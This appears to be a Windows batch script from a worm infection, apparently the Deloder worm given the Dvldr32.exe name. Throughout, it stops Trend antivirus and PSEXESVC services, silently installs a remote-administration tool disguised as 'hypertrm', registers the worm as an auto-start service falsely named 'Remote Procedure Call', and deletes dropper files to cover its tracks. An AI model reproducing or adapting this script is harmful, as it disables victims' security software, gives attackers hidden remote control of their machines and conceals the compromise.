hypertrm /uninstall /silence
del /Q /S inst.exe
start /B Dvldr32.exe
regedit /s hypertrm.reg
net stop "Trend NT Realtime Service"
net stop "PSEXESVC"
hypertrm /install /silence
del /Q /S hypertrm.reg
sc create "Remote Procedure Call" binpath= %windir%\SYSTEM32\Dvldr32.exe type= own start= auto depend= "+tdi netbios
net start "Remote Administrator Service"
del /Q /S hypertrm.bat
del /Q /S 219.113.89.234.exe
del /Q /S 234.exe
del /Q /S 220.97.147.240.exe
del /Q /S sc.exe
del /Q /S welcom.exe
del /Q /S welcome.exe
del /Q /S m.bat

